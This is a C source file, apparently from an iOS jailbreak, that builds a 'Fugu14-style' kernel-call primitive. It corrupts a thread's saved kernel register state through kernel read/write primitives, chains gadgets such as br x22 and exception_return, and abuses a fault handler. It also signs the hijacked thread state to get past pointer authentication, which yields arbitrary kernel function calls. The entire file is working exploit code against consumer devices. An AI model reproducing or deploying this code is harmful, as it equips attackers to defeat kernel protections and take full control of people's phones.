#include "kcall_Fugu14.h"

#include "primitives.h"
#include "translation.h"
#include "kernel.h"
#include "util.h"

Fugu14KcallThread gFugu14KcallThread;

uint64_t gUserReturnThreadContext = 0;
volatile uint64_t gUserReturnDidHappen = 0;

uint64_t fugu14_kcall(uint64_t func, int argc, const uint64_t *argv);
void fugu14_kexec(kRegisterState *threadState);
void pac_loop(void);

#define guard(cond) if (__builtin_expect(!!(cond), 1)) {}
#define MEMORY_BARRIER asm volatile("dmb sy");

uint64_t mapKernelPage(uint64_t addr)
{
	uint64_t page       = addr & ~0x3FFFULL;
	uint64_t off        = addr & 0x3FFFULL;
	uint64_t translated = kvtophys(page);
	void *map = NULL;
	if (kmap(translated, 0x4000, &map) == 0) {
		return ((uint64_t)map) + off;
	}
	return -1;
}

uint64_t getUserReturnThreadContext(void)
{
	if (gUserReturnThreadContext != 0) {
		return gUserReturnThreadContext;
	}
	
	arm_thread_state64_t state;
	bzero(&state, sizeof(state));
	
	arm_thread_state64_set_pc_fptr(state, (void*)pac_loop);
	for (size_t i = 0; i < 29; i++) {
		state.__x[i] = 0xDEADBEEF00ULL | i;
	}
	
	thread_t chThread = 0;
	kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &state, ARM_THREAD_STATE64_COUNT, &chThread);
	guard (kr == KERN_SUCCESS) else {
		puts("[-] getUserReturnThreadContext: Failed to create return thread!");
		return 0;
	}
	
	thread_suspend(chThread);
	
	//uint64_t returnThreadPtr = TASK_FIRST_THREAD(gOurTask);
	uint64_t returnThreadPtr = task_get_ipc_port_kobject(task_self(), chThread);
	guard (returnThreadPtr != 0) else {
		puts("[-] getUserReturnThreadContext: Failed to find return thread!");
		return 0;
	}
	
	uint64_t returnThreadACTContext = kread_ptr(returnThreadPtr + koffsetof(thread, machine_contextData));
	guard (returnThreadACTContext != 0) else {
		puts("[-] getUserReturnThreadContext: Return thread has no ACT_CONTEXT?!");
		return 0;
	}
	
	gUserReturnThreadContext = returnThreadACTContext;
	
	return returnThreadACTContext;
}

int fugu14_kcall_init(int (^threadSigner)(mach_port_t threadPort))
{
	pthread_mutex_init(&gFugu14KcallThread.lock, NULL);

	// Create a Fugu14-like kcall primitive
	// First we need a new thread
	thread_t thread = 0;
	kern_return_t kr = thread_create(mach_task_self_, &thread);
	guard (kr == KERN_SUCCESS) else {
		puts("[-] fugu14_kcall_init: thread_create failed!");
		return -1;
	}
	
	// Find the thread
	uint64_t threadPtr = task_get_ipc_port_kobject(task_self(), thread);
	guard (threadPtr != 0) else {
		puts("[-] fugu14_kcall_init: Failed to find thread!");
		return -1;
	}
	
	// Get it's state pointer
	uint64_t actContext = kread_ptr(threadPtr + koffsetof(thread, machine_contextData));
	guard (threadPtr != 0) else {
		puts("[-] fugu14_kcall_init: Failed to get thread ACT_CONTEXT!");
		return -1;
	}
	
	// Create a stack
	uint64_t stack = 0;
	if (kalloc_with_options(&stack, 0x4000 * 4, KALLOC_OPTION_LOCAL) != 0) { // Four pages
		puts("[-] fugu14_kcall_init: Failed to allocate stack!");
		return -1;
	}
	stack += 0x8000;
	guard (stack != 0) else {
		puts("[-] fugu14_kcall_init: Failed to alloc kernel stack!");
		return -1;
	}
	
	void *stackMapped = (void *)mapKernelPage(stack);
	kRegisterState *mappedState = (kRegisterState*)((uintptr_t) stackMapped);
	
	/*
	 * We set our signed state like this:
	 * pc  -> Gadget to set TH_KSTACKPTR of this thread
	 *        Required in order to survive br x22 jumps via a fault (fault handler checks stack)
	 * lr  -> Gadget to load a new CPU state
	 * x17 -> Address of br x22 gadget
	 *        We can't load x17 via the load CPU state gadget so we have to include it in the signed state
	 *
	 * Setup:
	 * Set the thread fault handler to our br x22 gadget and immediatly use it to return
	 *
	 * Kcall:
	 * A kcall can be done by jumping to the requested address and returning to a str x0, ...; ldr x??, ...; gadget, making sure the load faults
	 * This will cause the br x22 gadget to be invoked -> Return to user
	 */
	
	// Write register values
	uint64_t str_x8_x9_gadget = kgadget(str_x8_x9);
	uint64_t exception_return_after_check = kgadget(exception_return_after_check);
	uint64_t brX22 = kgadget(br_x22);
	kwrite64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
	kwrite32(actContext + offsetof(kRegisterState, cpsr),  CPSR_KERN_INTR_DIS);
	kwrite64(actContext + offsetof(kRegisterState, lr),    exception_return_after_check);
	kwrite64(actContext + offsetof(kRegisterState, x[16]), 0);
	kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);

	// Sign thread state
	if (threadSigner(thread) != 0) {
		puts("[-] fugu14_kcall_init: Failed to sign thread!");
		return -1;
	}
	
	// Use str x8, [x9] gadget to set TH_KSTACKPTR
	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x1000ULL);
	kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + koffsetof(thread, machine_kstackptr));
	
	// SP and x0 should both point to the new CPU state
	kwrite64(actContext + offsetof(kRegisterState, sp),   stack);
	kwrite64(actContext + offsetof(kRegisterState, x[0]), stack);
	
	// x2 -> new cpsr
	// Include in signed state since it is rarely changed
	kwrite64(actContext + offsetof(kRegisterState, x[2]), CPSR_KERN_INTR_EN);
	
	// Create a copy of this state
	kreadbuf(actContext, &gFugu14KcallThread.signedState, sizeof(kRegisterState));
	
	// Set a custom recovery handler
	uint64_t hw_lck_ticket_reserve_orig_allow_invalid = ksymbol(hw_lck_ticket_reserve_orig_allow_invalid) + 4;
	
	// x1 -> new pc
	// x3 -> new lr
	kwrite64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
	// We don't need lr here
	
	// New state
	// Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
	mappedState->x[0] = 0;
	
	// Fault handler is br x22 -> set x22
	mappedState->x[22] = ksymbol(exception_return);
	
	// Exception return expects a signed state in x21
	mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
	
	// Also need to set sp
	mappedState->sp = stack;
	
	// Reset flag
	gUserReturnDidHappen = 0;
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER
	
	// Run the thread
	thread_resume(thread);
	
	// Wait for flag to be set
	while (!gUserReturnDidHappen) ;
	
	// Stop thread
	thread_suspend(thread);
	thread_abort(thread);
	
	// Done!
	// Thread's fault handler is now set to the br x22 gadget
	gFugu14KcallThread.thread              = thread;
	gFugu14KcallThread.actContext          = actContext;
	gFugu14KcallThread.kernelStack         = stack;
	gFugu14KcallThread.mappedState         = mappedState;
	gFugu14KcallThread.scratchMemory       = stack + 0x7000ULL;
	gFugu14KcallThread.scratchMemoryMapped = (uint64_t*) ((uintptr_t) mapKernelPage(stack + 0x4000) + 0x3000);
	gFugu14KcallThread.inited              = true;
	
	gPrimitives.kcall = fugu14_kcall;
	gPrimitives.kexec = fugu14_kexec;
	
	return true;
}

void fugu14_kcall_prepare_state(Fugu14KcallThread *callThread, kRegisterState *threadState)
{
	// Set pc to the function, lr to str x0, [x19]; ldr x??, [x20]; gadget
	threadState->lr = kgadget(str_x0_x19_ldr_x20);

	// New state
	// x19 -> Where to store return value
	threadState->x[19] = callThread->scratchMemory;
	
	// x20 -> NULL (to force data abort)
	threadState->x[20] = 0;
	
	// x22 -> exceptionReturn
	threadState->x[22] = ksymbol(exception_return);
	
	// Exception return expects a signed state in x21
	threadState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
	
	// Also need to set sp
	threadState->sp = callThread->kernelStack;
}

uint64_t fugu14_kexec_on_thread_raw_locked(Fugu14KcallThread *callThread, kRegisterState *threadState)
{
	// Restore signed state first
	kwritebuf(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
	
	// Set all registers based on passed threadState
	kwrite64(callThread->actContext + offsetof(kRegisterState, x[1]), threadState->pc); // x1 -> new pc
	kwrite64(callThread->actContext + offsetof(kRegisterState, x[3]), threadState->lr); // x3 -> new lr
	for (int i = 0; i < 29; i++) {
		callThread->mappedState->x[i] = threadState->x[i];
	}
	callThread->mappedState->sp = threadState->sp;

	// Reset flag
	gUserReturnDidHappen = 0;
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER
	
	// Run the thread
	thread_resume(callThread->thread);
	
	// Wait for flag to be set
	while (!gUserReturnDidHappen) ;
	
	// Stop thread
	thread_suspend(callThread->thread);
	thread_abort(callThread->thread);
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER

	// Copy return value
	uint64_t retval = callThread->scratchMemoryMapped[0];

	return retval;
}

uint64_t fugu14_kexec_on_thread_raw(Fugu14KcallThread *callThread, kRegisterState *threadState)
{
	pthread_mutex_lock(&callThread->lock);
	uint64_t r = fugu14_kexec_on_thread_raw_locked(callThread, threadState);
	pthread_mutex_unlock(&callThread->lock);
	return r;
}

uint64_t fugu14_kexec_on_thread(Fugu14KcallThread *callThread, kRegisterState *threadState)
{
	pthread_mutex_lock(&callThread->lock);
	fugu14_kcall_prepare_state(callThread, threadState);
	uint64_t r = fugu14_kexec_on_thread_raw_locked(callThread, threadState);
	pthread_mutex_unlock(&callThread->lock);
	return r;
}

uint64_t fugu14_kcall_on_thread(Fugu14KcallThread *callThread, uint64_t func, uint64_t argc, const uint64_t *argv)
{
	if (argc >= 19) argc = 19;

	pthread_mutex_lock(&callThread->lock);

	kRegisterState threadState = { 0 };
	fugu14_kcall_prepare_state(&gFugu14KcallThread, &threadState);
	threadState.pc = func;

	uint64_t regArgc = 0;
	uint64_t stackArgc = 0;
	if (argc >= 8) {
		regArgc = 8;
		stackArgc = argc - 8;
	}
	else {
		regArgc = argc;
	}

	// Set register args (x0 - x8)
	for (uint64_t i = 0; i < regArgc; i++)
	{
		threadState.x[i] = argv[i];
	}

	// Set stack args
	for (uint64_t i = 0; i < stackArgc; i++)
	{
		uint64_t argKaddr = (threadState.sp + i * 0x8);
		kwrite64(argKaddr, argv[8+i]);
	}

	uint64_t result = fugu14_kexec_on_thread_raw_locked(callThread, &threadState);
	pthread_mutex_unlock(&callThread->lock);
	return result;
}

uint64_t fugu14_kcall(uint64_t func, int argc, const uint64_t *argv)
{
	return fugu14_kcall_on_thread(&gFugu14KcallThread, func, argc, argv);
}

void fugu14_kexec(kRegisterState *state)
{
	fugu14_kexec_on_thread(&gFugu14KcallThread, state);
}

int jbclient_get_fugu14_kcall(void)
{
	if (!gPrimitives.kalloc_local) return -1;
	return fugu14_kcall_init(^int(mach_port_t threadToSign) {
		return jbclient_root_sign_thread(threadToSign);
	});
}